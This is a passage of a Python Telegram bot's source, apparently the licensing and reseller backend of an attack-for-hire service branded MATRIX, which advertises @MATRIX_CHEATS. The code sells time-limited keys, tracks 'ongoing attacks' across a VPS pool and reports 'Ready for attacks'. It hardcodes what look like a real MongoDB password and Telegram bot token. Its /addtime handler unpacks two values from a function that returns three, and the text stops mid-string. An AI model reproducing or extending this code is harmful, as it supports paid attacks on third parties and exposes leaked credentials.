#!/usr/bin/python3
import telebot
import multiprocessing
import os
import random 
from datetime import datetime, timedelta
import subprocess
import sys
import time
import logging
import socket
import pytz
import pymongo
import threading
import requests
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from requests.exceptions import ReadTimeout, RequestException
import paramiko
from time import sleep as wait 

# MongoDB configuration
uri = "mongodb+srv://uthayakrishna67:Uthaya$0@cluster0.mlxuz.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = pymongo.MongoClient(uri)
db = client['telegram_botcheck']
users_collection = db['users']
keys_collection = db['unused_keys']

# At the beginning of your code, add this configuration
def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# Initialize bot with the session
bot = telebot.TeleBot('7858493439:AAEDGY4WNmZkDHMFwwUbarXWmO3GXc8rB2s')
bot.session = create_session()

admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

IST = pytz.timezone('Asia/Kolkata')

# Store ongoing attacks globally
ongoing_attacks = []

def read_users():
    try:
        current_time = datetime.now(IST)
        users = users_collection.find({"expiration": {"$gt": current_time}})
        return {user["user_id"]: user["expiration"] for user in users}
    except Exception as e:
        logging.error(f"Error reading users: {e}")
        return {}

def clean_expired_users():
    try:
        current_time = datetime.now(IST)
        # Find expired users
        expired_users = list(users_collection.find({"expiration": {"$lt": current_time}}))
        
        # Process notifications and deletion in a single batch
        if expired_users:
            # Send notifications first
            for user in expired_users:
                user_message = f"""🚫 Subscription Expired
👤 User: @{user['username']}
🔑 Key: {user['key']}
⏰ Expired at: {user['expiration'].strftime('%Y-%m-%d %H:%M:%S')} IST

🛒 To renew your subscription:
1. Contact your reseller or admin
2. Purchase a new key
3. Use the `/redeem` command to activate it

📢 For assistance, contact support or visit our channel: @MATRIX_CHEATS"""
                
                try:
                    bot.send_message(user['user_id'], user_message)
                except Exception as e:
                    logging.error(f"Failed to notify user {user['user_id']}: {e}")
                    continue
                
                # Notify admin once per expired user
                admin_message = f"""🚨 Key Expired Notification
👤 User: @{user['username']}
🆔 User ID: {user['user_id']}
🔑 Key: {user['key']}
⏰ Expired at: {user['expiration'].strftime('%Y-%m-%d %H:%M:%S')} IST"""
                
                for admin in admin_id:
                    try:
                        bot.send_message(admin, admin_message)
                    except Exception as e:
                        logging.error(f"Failed to notify admin {admin}: {e}")
            
            # Delete all expired users in a single operation
            user_ids = [user['user_id'] for user in expired_users]
            users_collection.delete_many({"user_id": {"$in": user_ids}})
            
    except Exception as e:
        logging.error(f"Error cleaning expired users: {e}")


def create_indexes():
    try:
        users_collection.create_index("user_id", unique=True)
        users_collection.create_index("expiration")
        
        keys_collection.create_index("key", unique=True)
    except Exception as e:
        logging.error(f"Error creating indexes: {e}")

        logging.error(f"Error creating indexes: {e}")

def parse_time_input(time_input, max_uses=None):
    print(f"DEBUG - Received time_input: {time_input}, max_uses: {max_uses}")  # Debug print
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)

        if unit == "m":
            result = (timedelta(minutes=number), f"{number}m", max_uses or 1)
        elif unit == "h":
            result = (timedelta(hours=number), f"{number}h", max_uses or 1)
        elif unit == "d":
            result = (timedelta(days=number), f"{number}d", max_uses or 1)
        else:
            result = None, None, None
    else:
        result = None, None, None
    
    print("DEBUG - parse_time_input returning:", result)  # Debug output
    return result


@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /key <duration>\nExample: /key 1d, /key 7d")
            return

        duration_str = args[1]

        # Parse the time input
        duration, formatted_duration, _ = parse_time_input(duration_str)  

        if not duration:
            bot.reply_to(message, "❌ Invalid duration format. Use: 1d, 7d, 30d")
            return

        # Generate a unique key
        letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
        numbers = ''.join(str(random.randint(0, 9)) for _ in range(4))
        key = f"MATRIX-VIP-{letters}{numbers}"

        # Store duration but DO NOT set expiration yet (it will be set on redemption)
        created_at = datetime.now(IST)  # Use IST timezone

        keys_collection.insert_one({
            "key": key,
            "duration": formatted_duration,
            "created_at": created_at,
            "is_used": False
        })

        # Build the success message
        success_message = f"""
✅ Key Generated Successfully
━━━━━━━━━━━━━━━
🔑 Key: `{key}`
⏱ Duration: {formatted_duration}
📅 Created At: {created_at.strftime('%Y-%m-%d %H:%M:%S')} IST
━━━━━━━━━━━━━━━
💡 Expiration starts when redeemed.
"""

        bot.reply_to(message, success_message)

    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}")



# Modify the /redeem command to support multi-use keys
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    try:
        user_id = str(message.chat.id)

        # Prevent usage in groups
        if user_id.startswith('-'):
            bot.reply_to(message, "⚠️ This command cannot be used in groups. Please use it in private chat with the bot.")
            return

        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /redeem <key>\nExample: /redeem MATRIX-VIP-XXXX")
            return

        key = args[1].strip()
        username = message.from_user.username or "Unknown"
        current_time = datetime.now(IST)

        # ✅ Check if the user already exists
        existing_user = users_collection.find_one({"user_id": user_id})
        if existing_user:
            expiration = existing_user['expiration']
            
            # ✅ Convert string expiration to datetime if needed
            if isinstance(expiration, str):
                expiration = datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S IST')

            expiration = expiration.astimezone(IST)

            bot.reply_to(message, f"""
⚠️ You already have an active subscription!
━━━━━━━━━━━━━━━
👤 User: @{message.from_user.username}
🔑 Key: {existing_user['key']}
📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST

⚠️ You must wait until your current subscription expires before redeeming a new key.
━━━━━━━━━━━━━━━""")
            return

        # ✅ Check if the key exists
        key_doc = keys_collection.find_one({"key": key, "is_used": False})
        if not key_doc:
            bot.reply_to(message, "❌ Invalid key!")
            return

        # ✅ Get expiration time
        duration_str = key_doc.get("duration")
        duration, _, _ = parse_time_input(duration_str)
        expiration = current_time + duration if duration else None

        # Ensure expiration is a valid datetime
        if expiration and expiration < current_time:
            bot.reply_to(message, "❌ This key has expired!")
            return

        # ✅ Handle multi-use keys
        if "max_uses" in key_doc:
            if key_doc["used_count"] >= key_doc["max_uses"]:
                bot.reply_to(message, "❌ This key has reached its maximum usage limit!")
                keys_collection.update_one({"key": key}, {"$set": {"is_used": True}})
                return
            else:
                # Increment the used count
                keys_collection.update_one({"key": key}, {"$inc": {"used_count": 1}})
                used_count = key_doc["used_count"] + 1
                max_uses = key_doc["max_uses"]
                usage_status = f"{used_count}/{max_uses}"
        else:
            usage_status = "Single-use"
            keys_collection.update_one({"key": key}, {"$set": {"is_used": True}})

        # ✅ Store the user
        users_collection.insert_one({
            "user_id": user_id,
            "username": username,
            "key": key,
            "redeemed_at": current_time.strftime('%Y-%m-%d %H:%M:%S') + " IST",
            "expiration": expiration  # Store as a datetime object
        })

        # ✅ Send success message
        success_message = f"""
✅ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬
━━━━━━━━━━━━━━━
👤 User: @{username}
🆔 ID: {user_id}
🔑 Key: {key}
⏱️ Duration: {key_doc.get("duration", "Unknown")}
📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
━━━━━━━━━━━━━━━
💡 Enjoy your subscription!
"""

        bot.reply_to(message, success_message)

        # ✅ Notify admins
        admin_message = f"""
🚨 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡
━━━━━━━━━━━━━━━
👤 User: @{username}
🆔 User ID: {user_id}
🔑 Key: {key}
⏱️ Duration: {key_doc.get("duration", "Unknown")}
📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
"""

        if "max_uses" in key_doc:
            admin_message += f"🔢 Usage: {usage_status}\n"

        admin_message += "━━━━━━━━━━━━━━━"

        for admin in admin_id:
            bot.send_message(admin, admin_message)

    except Exception as e:
        bot.reply_to(message, f"❌ Error redeeming key: {str(e)}")
        print(f"ERROR - redeem_key(): {e}")



@bot.message_handler(commands=['addtime'])
def add_time(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, """⛔️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗
━━━━━━━━━━━━━━━
❌ This command is restricted to admin use only""")
        return

    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, """📝 𝗔𝗗𝗗 𝗧𝗜𝗠𝗘 𝗨𝗦𝗔𝗚𝗘
━━━━━━━━━━━━━━━
Command: /addtime <key> <duration>

⚡️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗙𝗼𝗿𝗺𝗮𝘁:
• Minutes: 30m
• Hours: 12h
• Days: 7d

📝 𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀:
• /addtime MATRIX-VIP-ABCD1234 30m
• /addtime MATRIX-VIP-WXYZ5678 24h
• /addtime MATRIX-VIP-EFGH9012 7d""")
            return

        key = args[1]
        duration_str = args[2]
        
        # Find user with this key
        user = users_collection.find_one({"key": key})
        if not user:
            bot.reply_to(message, """❌ 𝗞𝗘𝗬 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗
━━━━━━━━━━━━━━━
The specified key is not associated with any active user.""")
            return

        duration, formatted_duration = parse_time_input(duration_str)
        if not duration:
            bot.reply_to(message, """❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡
━━━━━━━━━━━━━━━
Please use the following format:
• Minutes: 30m
• Hours: 12h
• Days: 7d""")
            return

        # Update expiration time with IST
        current_expiration = user['expiration'].astimezone(IST)
        new_expiration = current_expiration + duration

        users_collection.update_one(
            {"key": key},
            {"$set": {"expiration": new_expiration}}
        )

        # Notify user
        user_notification = f"""🎉 𝗧𝗜𝗠𝗘 𝗘𝗫𝗧𝗘𝗡𝗗𝗘𝗗
━━━━━━━━━━━━━━━
✨ Your subscription has been extended!

⏱️ 𝗔𝗱𝗱𝗲𝗱 𝗧𝗶𝗺𝗲: {formatted_duration}
📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {new_expiration.strftime('%Y-%m-%d %H:%M:%S')} IST

💫 Enjoy your extended access!
━━━━━━━━━━━━━━━"""
        
        bot.send_message(user['user_id'], user_notification)

        # Current time in IST for admin message
        current_time_ist = datetime.now(IST)

        # Confirm to admin
        admin_message = f"""✅ 𝗧𝗜𝗠𝗘 𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬
━━━━━━━━━━━━━━━
👤 𝗨𝘀𝗲𝗿: @{user['username']}
🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: {user['user_id']}
🔑 𝗞𝗲𝘆: {key}
⏱️ 𝗔𝗱𝗱𝗲𝗱 𝗧𝗶𝗺𝗲: {formatted_duration}
📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {new_expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
⏰ 𝗧𝗶𝗺𝗲 𝗢𝗳 𝗔𝗰𝘁𝗶𝗼𝗻: {current_time_ist.strftime('%Y-%m-%d %H:%M:%S')} IST
━━━━━━━━━━━━━━━"""
        
        bot.reply_to(message, admin_message)

    except Exception as e:
        error_message = f"""❌ 𝗘𝗥𝗥𝗢𝗥
━━━━━━━━━━━━━━━
Failed to add time: {str(e)}
⏰ 𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST"""
        bot.reply_to(message, error_message)


@bot.message_handler(commands=['allkeys'])
def all_keys(message):
    user_id = str(message.chat.id)

    # Ensure only admins or resellers can access this command
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔ Access Denied: Admin-only command")
        return

    try:
        # Get current IST time
        current_time = datetime.now(IST)

        # Fetch all ACTIVE and USABLE keys
        all_keys = list(db.get_collection("unused_keys").aggregate([
            {
                "$lookup": {
                    "from": "reseller_transactions",
                    "localField": "key",
                    "foreignField": "key_generated",
                    "as": "transaction"
                }
            },
            {
                "$match": {
                    "is_used": False,  # Ensure only unused keys are shown
                    "$or": [
                        {"max_uses": {"$exists": False}},  # Single-use keys
                        {"max_uses": {"$gt": 0}, "$expr": {"$lt": ["$used_count", "$max_uses"]}}  # Multi-use keys with remaining uses
                    ],
                    "$or": [
                        {"expiration": {"$exists": False}},  # No expiration set
                        {"expiration": {"$gte": current_time}}  # Not expired
                    ]
                }
            }
        ]))

        if not all_keys:
            bot.reply_to(message, 
                "✅ No Active Keys Available\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "🚀 All usable keys have been redeemed.\n"
                "🔑 Generate new keys using /key or /gkey.\n"
                "━━━━━━━━━━━━━━━━━━━━━━"
            )
            return

        # Fetch reseller transactions to match resellers with keys
        reseller_transactions = list(db.get_collection("reseller_transactions").find({"type": "KEY_GENERATION"}))

        # Fetch reseller usernames using `telegram_id`
        reseller_data = list(db.get_collection("resellers").find({}, {"telegram_id": 1, "username": 1, "balance": 1}))
        resellers = {str(r["telegram_id"]): {"username": r.get("username", f"Unknown ({r['telegram_id']})"), "balance": r["balance"]} for r in reseller_data}

        # Map reseller transactions to include usernames
        reseller_map = {}
        for txn in reseller_transactions:
            reseller_id = str(txn["reseller_id"])  # Ensure reseller_id is a string
            reseller_username = resellers.get(reseller_id, {}).get("username", f"Unknown ({reseller_id})")
            reseller_map[txn["key_generated"]] = {"id": reseller_id, "username": reseller_username}

        # Sorting Data
        single_use_admin, multi_use_admin = [], []
        reseller_keys = {}  # Group reseller keys by their username

        for key in all_keys:
            key_code = key.get("key")
            max_uses = key.get("max_uses", 1)  # Default to 1 if not set
            used_count = key.get("used_count", 0)
            is_multi_use = max_uses > 1 and used_count < max_uses
            is_single_use = max_uses == 1 or "max_uses" not in key  # Correctly detect single-use keys

            if key_code in reseller_map:
                reseller_info = reseller_map[key_code]  # Now contains both ID and username
                reseller_id = reseller_info["id"]
                reseller_username = reseller_info["username"]

                if reseller_id not in reseller_keys:
                    reseller_keys[reseller_id] = {
                        "username": reseller_username,  # Now properly stores the username
                        "balance": resellers.get(reseller_id, {}).get("balance", 0),
                        "single_use": [],
                        "multi_use": []
                    }

                if is_multi_use:
                    reseller_keys[reseller_id]["multi_use"].append(key)
                elif is_single_use:
                    reseller_keys[reseller_id]["single_use"].append(key)
            else:
                if is_multi_use:
                    multi_use_admin.append(key)
                elif is_single_use:
                    single_use_admin.append(key)

        # 📜 **Formatted Message**
        message_text = (
            "📜 ACTIVE KEYS AVAILABLE\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Usable Keys: {len(all_keys)}\n"
            f"🔄 Multi-use Keys (Usable): {len(multi_use_admin) + sum(len(v['multi_use']) for v in reseller_keys.values())}\n"
            f"👤 Admin Created Keys: {len(single_use_admin) + len(multi_use_admin)}\n"
            f"👥 Reseller Created Keys: {sum(len(v['single_use']) + len(v['multi_use']) for v in reseller_keys.values())}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
        )

        # 🔹 **List Admin Multi-Use Keys**
        if multi_use_admin:
            message_text += "🔄 Multi-use Admin Keys:\n"
            for key in multi_use_admin:
                expiry = key.get("expiration", "No Expiry")
                if isinstance(expiry, datetime):
                    if expiry.tzinfo is None:
                        expiry = expiry.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                    expiry = expiry.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                else:
                    expiry = "No Expiry"

                created_at = key.get("created_at", "Unknown")
                if isinstance(created_at, datetime):
                    if created_at.tzinfo is None:
                        created_at = created_at.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                    created_at = created_at.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                else:
                    created_at = "Unknown"

                duration = key.get("duration", "Unknown")
                message_text += (
                    f"🔄 Key: `{key['key']}`\n"
                    f"   Uses: {key['used_count']}/{key['max_uses']}\n"
                    f"   Duration: {duration}\n"
                    f"   Created: {created_at}\n"
                    f"   Expires: {expiry}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                )

        # 🔹 **List Admin Single-Use Keys**
        if single_use_admin:
            message_text += "🔹 Single-use Admin Keys:\n"
            for key in single_use_admin:
                expiry = key.get("expiration", "No Expiry")
                if isinstance(expiry, datetime):
                    if expiry.tzinfo is None:
                        expiry = expiry.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                    expiry = expiry.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                else:
                    expiry = "No Expiry"

                created_at = key.get("created_at", "Unknown")
                if isinstance(created_at, datetime):
                    if created_at.tzinfo is None:
                        created_at = created_at.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                    created_at = created_at.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                else:
                    created_at = "Unknown"

                duration = key.get("duration", "Unknown")
                message_text += (
                    f"🔹 Key: `{key['key']}`\n"
                    f"   Duration: {duration}\n"
                    f"   Created: {created_at}\n"
                    f"   Expires: {expiry}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                )

        # 🔹 **List Reseller Keys by Reseller**
        if reseller_keys:
            for reseller_id, data in reseller_keys.items():
                message_text += (
                    f"👥 Reseller: @{data['username']}\n"
                    f"💰 Balance: {data['balance']:,} Credits\n"
                )
                if data["multi_use"]:
                    message_text += "🔄 Multi-use Reseller Keys:\n"
                    for key in data["multi_use"]:
                        expiry = key.get("expiration", "No Expiry")
                        if isinstance(expiry, datetime):
                            if expiry.tzinfo is None:
                                expiry = expiry.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                            expiry = expiry.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                        else:
                            expiry = "No Expiry"

                        created_at = key.get("created_at", "Unknown")
                        if isinstance(created_at, datetime):
                            if created_at.tzinfo is None:
                                created_at = created_at.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                            created_at = created_at.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                        else:
                            created_at = "Unknown"

                        duration = key.get("duration", "Unknown")
                        message_text += (
                            f"🔄 Key: `{key['key']}`\n"
                            f"   Uses: {key['used_count']}/{key['max_uses']}\n"
                            f"   Duration: {duration}\n"
                            f"   Created: {created_at}\n"
                            f"   Expires: {expiry}\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                        )

                if data["single_use"]:
                    message_text += "🔹 Single-use Reseller Keys:\n"
                    for key in data["single_use"]:
                        expiry = key.get("expiration", "No Expiry")
                        if isinstance(expiry, datetime):
                            if expiry.tzinfo is None:
                                expiry = expiry.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                            expiry = expiry.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                        else:
                            expiry = "No Expiry"

                        created_at = key.get("created_at", "Unknown")
                        if isinstance(created_at, datetime):
                            if created_at.tzinfo is None:
                                created_at = created_at.replace(tzinfo=pytz.UTC)  # Assume UTC if no timezone
                            created_at = created_at.astimezone(IST).strftime('%Y-%m-%d %H:%M:%S') + " IST"
                        else:
                            created_at = "Unknown"

                        duration = key.get("duration", "Unknown")
                        message_text += (
                            f"🔹 Key: `{key['key']}`\n"
                            f"   Duration: {duration}\n"
                            f"   Created: {created_at}\n"
                            f"   Expires: {expiry}\n"
                            "━━━━━━━━━━━━━━━━━━━━━━\n"
                        )

        # ✅ **Send the Response**
        bot.reply_to(message, message_text)

    except Exception as e:
        bot.reply_to(message, f"❌ Error retrieving active keys: {str(e)}")
        print(f"ERROR - all_keys(): {e}")

@bot.message_handler(commands=['allusers'])
def show_users(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
        
    try:
        current_time = datetime.now(IST)
        
        # Aggregate users with reseller info and sort by expiration
        users = users_collection.aggregate([
            {
                "$match": {
                    "expiration": {"$gt": current_time},
                    "$or": [
                        {"max_uses": {"$exists": False}},  # Single-use keys
                        {"max_uses": {"$gt": "$used_count"}}  # Multi-use keys with remaining uses
                    ]
                }
            },
            {
                "$lookup": {
                    "from": "reseller_transactions",
                    "localField": "key",
                    "foreignField": "key_generated",
                    "as": "transaction"
                }
            },
            {
                "$sort": {
                    "expiration": 1
                }
            }
        ])
        
        if not users:
            bot.reply_to(message, "📝 No active users found")
            return

        # Group users by reseller
        reseller_users = {}
        total_users = 0
        
        for user in users:
            reseller_id = user['transaction'][0]['reseller_id'] if user.get('transaction') else 'admin'
            if reseller_id not in reseller_users:
                reseller_users[reseller_id] = []
                
            remaining = user['expiration'].astimezone(IST) - current_time
            expiration_ist = user['expiration'].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')
            
            user_info = f"""👤 User: @{user.get('username', 'N/A')}
🆔 ID: `{user['user_id']}`
🔑 Key: `{user['key']}`
⏳ Remaining: {remaining.days}d {remaining.seconds // 3600}h
📅 Expires: {expiration_ist} IST"""
            reseller_users[reseller_id].append(user_info)
            total_users += 1

        # Build response message
        response = f"👥 Active Users: {total_users}\n\n"
        
        for reseller_id, users_list in reseller_users.items():
            try:
                if reseller_id == 'admin':
                    reseller_name = "Admin Generated"
                else:
                    user_info = bot.get_chat(reseller_id)
                    reseller_name = f"@{user_info.username}" if user_info.username else user_info.first_name
                    
                response += f"👤 {reseller_name} ({len(users_list)} users):\n"
                response += "━━━━━━━━━━━━━━━\n"
                response += "\n\n".join(users_list)
                response += "\n\n"
            except Exception:
                continue

        # Split response if too long
        if len(response) > 4096:
            for x in range(0, len(response), 4096):
                bot.reply_to(message, response[x:x+4096])
        else:
            bot.reply_to(message, response)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching users: {str(e)}")

# Add this function to parse the multi-use key input
def parse_multi_use_key_input(time_input, max_uses):
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)
        
        if unit == "m":
            return timedelta(minutes=number), f"{number}m", max_uses
        elif unit == "h":
            return timedelta(hours=number), f"{number}h", max_uses
        elif unit == "d":
            return timedelta(days=number), f"{number}d", max_uses
    return None, None, None

# Add the /gkey command to generate multi-use keys
@bot.message_handler(commands=['gkey'])
def generate_multi_use_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "📝 Usage: /gkey <duration> <max_uses>\nExample: /gkey 1h 5")
            return

        duration_str = args[1]
        max_uses = int(args[2])

        # Parse the time input
        duration, formatted_duration, _ = parse_time_input(duration_str)

        if not duration:
            bot.reply_to(message, "❌ Invalid duration format. Use: 1d, 7d, 30d")
            return

        # Generate a unique key
        letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
        numbers = ''.join(str(random.randint(0, 9)) for _ in range(4))
        key = f"MATRIX-VIP-{letters}{numbers}"

        # Set expiration time immediately
        created_at = datetime.now(IST)
        expiration = created_at + duration

        keys_collection.insert_one({
            "key": key,
            "duration": formatted_duration,
            "created_at": created_at,
            "expiration": expiration,  # Expiration starts at key creation
            "is_used": False,
            "max_uses": max_uses,
            "used_count": 0
        })

        bot.reply_to(message, f"""✅ Multi-Use Key Generated Successfully
🔑 Key: `{key}`
⏱ Duration: {formatted_duration}
🔢 Max Uses: {max_uses}
📅 **Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST**
""")

    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}")


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
        
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "📝 Usage: /broadcast <message>")
        return
        
    broadcast_text = args[1]
    
    try:
        current_time = datetime.now(IST)
        users = list(users_collection.find({"expiration": {"$gt": current_time}}))
        
        if not users:
            bot.reply_to(message, "❌ No active users found to broadcast to.")
            return
            
        success_count = 0
        failed_users = []
        
        for user in users:
            try:
                formatted_message = f"""
📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘
{broadcast_text}
━━━━━━━━━━━━━━━
𝗦𝗲𝗻𝘁 𝗯𝘆: @{message.from_user.username}
𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST"""

                bot.send_message(user['user_id'], formatted_message)
                success_count += 1
                time.sleep(0.1)  # Prevent flooding
                
            except Exception as e:
                failed_users.append(f"@{user['username']}")
        
        summary = f"""
✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:
📨 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(users)}
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: {success_count}
❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {len(failed_users)}"""

        if failed_users:
            summary += "\n❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n" + "\n".join(failed_users)
            
        bot.reply_to(message, summary)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error during broadcast: {str(e)}")

@bot.message_handler(commands=['remove'])
def remove_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /remove <key>")
            return

        key = args[1]
        removed_from = []

        # Remove from unused keys collection
        result = keys_collection.delete_one({"key": key})
        if result.deleted_count > 0:
            removed_from.append("unused keys database")

        # Find and remove from users collection
        user = users_collection.find_one_and_delete({"key": key})
        if user:
            removed_from.append("active users database")
            # Send notification to the user
            user_notification = f"""
🚫 𝗞𝗲𝘆 𝗥𝗲𝘃𝗼𝗸𝗲𝗱
Your license key has been revoked by an administrator.
🔑 Key: {key}
⏰ Revoked at: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
📢 For support or to purchase a new key:
• Contact any admin or reseller
• Visit @MATRIX_CHEATS
"""
            try:
                bot.send_message(user['user_id'], user_notification)
            except Exception as e:
                logging.error(f"Failed to notify user {user['user_id']}: {e}")

        if not removed_from:
            bot.reply_to(message, f"""
❌ 𝗞𝗲𝘆 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱
The key {key} was not found in any database.
""")
            return

        # Send success message to admin
        admin_message = f"""
✅ 𝗞𝗲𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
🔑 Key: {key}
📊 Removed from: {', '.join(removed_from)}
⏰ Time: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        if user:
            admin_message += f"""
👤 User Details:
• Username: @{user.get('username', 'N/A')}
• User ID: {user['user_id']}
"""
        bot.reply_to(message, admin_message)

    except Exception as e:
        error_message = f"""
❌ 𝗘𝗿𝗿𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝗞𝗲𝘆
⚠️ Error: {str(e)}
"""
        logging.error(f"Error removing key: {e}")
        bot.reply_to(message, error_message)

@bot.message_handler(commands=['check'])
def check_server_status(message):
    try:
        user_id = str(message.chat.id)
        users = read_users()
        current_time = datetime.now(IST)
        
        # Check cooldown status
        cooldown_status = "🟢 Ready"
        remaining_time = 0
        if user_id in user_cooldowns:
            time_diff = (current_time - user_cooldowns[user_id]).total_seconds()
            if time_diff < 300:
                remaining_time = int(300 - time_diff)
                cooldown_status = f"🔴 {remaining_time}s remaining"

        # Check server availability
        any_available = False
        earliest_wait = float('inf')
        for vps in vps_list:
            if vps['active_attacks'] < vps['max_attacks']:
                any_available = True
                break
            elif vps['ongoing_attacks']:
                earliest_end = min((attack['end_time'] for attack in vps['ongoing_attacks']), default=current_time)
                wait_time = (earliest_end - current_time).total_seconds()
                earliest_wait = min(earliest_wait, wait_time)

        # Build subscription status
        if user_id in admin_id:
            sub_status = "👑 ADMIN ACCESS"
            expiry = "∞ Lifetime"
        elif user_id in users:
            sub_status = "✅ ACTIVE"
            expiry = users[user_id].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')
        else:
            sub_status = "❌ INACTIVE"
            expiry = "No active subscription"

        # Build server status message
        if any_available:
            server_status = "🟢 SERVERS AVAILABLE"
            wait_msg = "Ready for attacks"
        else:
            minutes = int(earliest_wait // 60)
            seconds = int(earliest_wait % 60)
            server_status = "🔴 SERVERS BUSY"
            wait_msg = f"Next Available in: {minutes}m {seconds}s"

        status_message = f"""
⚡️ 𝗠𝗔𝗧𝗥𝗜𝗫 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡️
